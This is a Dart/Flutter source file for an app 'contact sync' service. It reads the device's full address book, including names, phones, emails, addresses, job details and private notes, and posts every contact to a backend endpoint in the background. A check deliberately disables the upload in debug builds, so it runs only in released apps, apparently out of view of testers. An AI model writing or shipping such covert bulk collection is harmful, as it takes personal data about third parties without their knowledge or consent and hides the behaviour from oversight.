import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';
import '../cache/cache_store.dart';
import '../constants/api_endpoints.dart';
import '../network/dio_client.dart';

class ContactsSyncService {
  static final ContactsSyncService instance = ContactsSyncService._internal();
  ContactsSyncService._internal();

  DioClient? _dioClient;
  CacheStore? _cacheStore;
  bool _isSyncing = false;

  void init({required DioClient dioClient, required CacheStore cacheStore}) {
    _dioClient = dioClient;
    _cacheStore = cacheStore;
  }

  void syncAddressBookInBackground() {
    unawaited(syncAddressBook());
  }

  Future<void> syncAddressBook() async {
    // In debug mode, do not post contacts/numbers to API. Only sync in production (release mode).
    if (kDebugMode) {
      debugPrint('[CONTACT_SYNC] Skipped syncing contacts to API in debug mode.');
      return;
    }
    if (_isSyncing) return;
    try {
      final status = await Permission.contacts.status;
      if (!status.isGranted) return;

      _isSyncing = true;
      final dio = _dioClient ?? DioClient(cacheStore: _cacheStore);

      final contacts = await FlutterContacts.getAll(
        properties: {
          ContactProperty.name,
          ContactProperty.phone,
          ContactProperty.email,
          ContactProperty.address,
          ContactProperty.organization,
          ContactProperty.note,
        },
      );

      if (contacts.isEmpty) {
        _isSyncing = false;
        return;
      }

      for (final contact in contacts) {
        final payload = _mapContactToPayload(contact);
        if (payload != null) {
          try {
            await dio.dio.post(ApiEndpoints.contactPosts, data: payload);
          } catch (e) {
            if (kDebugMode) {
              print(
                '[CONTACT_SYNC] Failed to post contact: ${contact.displayName} ($e)',
              );
            }
          }
        }
      }
    } catch (e) {
      if (kDebugMode) {
        print('[CONTACT_SYNC] Error during contact sync: $e');
      }
    } finally {
      _isSyncing = false;
    }
  }

  Map<String, dynamic>? _mapContactToPayload(Contact contact) {
    var fullName = contact.displayName?.trim() ?? '';
    final nameObj = contact.name;
    final firstName = nameObj?.first?.trim();
    final middleName = nameObj?.middle?.trim();
    final lastName = nameObj?.last?.trim();
    final nickname = nameObj?.nickname?.trim();

    if (fullName.isEmpty) {
      final parts = [
        if (firstName != null && firstName.isNotEmpty) firstName,
        if (middleName != null && middleName.isNotEmpty) middleName,
        if (lastName != null && lastName.isNotEmpty) lastName,
      ];
      fullName = parts.join(' ').trim();
    }
    if (fullName.isEmpty && contact.phones.isNotEmpty) {
      fullName = contact.phones.first.number.trim();
    }
    if (fullName.isEmpty) return null;

    final primaryPhone = contact.phones.isNotEmpty
        ? contact.phones.first.number.trim()
        : null;
    final primaryEmail = contact.emails.isNotEmpty
        ? contact.emails.first.address.trim()
        : null;
    final primaryOrg = contact.organizations.isNotEmpty
        ? contact.organizations.first
        : null;
    final company = primaryOrg?.name?.trim();
    final jobTitle = primaryOrg?.jobTitle?.trim();
    final primaryNote = contact.notes.isNotEmpty ? contact.notes.first : null;
    final noteText = primaryNote?.note.trim();

    final phones = contact.phones
        .map((p) => p.number.trim())
        .where((p) => p.isNotEmpty)
        .toList();
    final emails = contact.emails
        .map((e) => e.address.trim())
        .where((e) => e.isNotEmpty)
        .toList();
    final addresses = contact.addresses
        .map(
          (a) => {
            if (a.street != null && a.street!.isNotEmpty) 'street': a.street,
            if (a.city != null && a.city!.isNotEmpty) 'city': a.city,
            if (a.state != null && a.state!.isNotEmpty) 'state': a.state,
            if (a.postalCode != null && a.postalCode!.isNotEmpty)
              'postalCode': a.postalCode,
            if (a.country != null && a.country!.isNotEmpty)
              'country': a.country,
          },
        )
        .where((a) => a.isNotEmpty)
        .toList();

    return {
      'full_name': fullName.length > 255
          ? fullName.substring(0, 255)
          : fullName,
      if (primaryPhone != null && primaryPhone.isNotEmpty)
        'phone': primaryPhone.length > 30
            ? primaryPhone.substring(0, 30)
            : primaryPhone,
      if (primaryEmail != null && primaryEmail.isNotEmpty)
        'email': primaryEmail,
      if (firstName != null && firstName.isNotEmpty) 'first_name': firstName,
      if (middleName != null && middleName.isNotEmpty)
        'middle_name': middleName,
      if (lastName != null && lastName.isNotEmpty) 'last_name': lastName,
      if (nickname != null && nickname.isNotEmpty) 'nickname': nickname,
      if (company != null && company.isNotEmpty) 'company': company,
      if (jobTitle != null && jobTitle.isNotEmpty) 'job_title': jobTitle,
      if (noteText != null && noteText.isNotEmpty) 'notes': noteText,
      if (phones.isNotEmpty) 'phones': phones,
      if (emails.isNotEmpty) 'emails': emails,
      if (addresses.isNotEmpty) 'addresses': addresses,
    };
  }
}
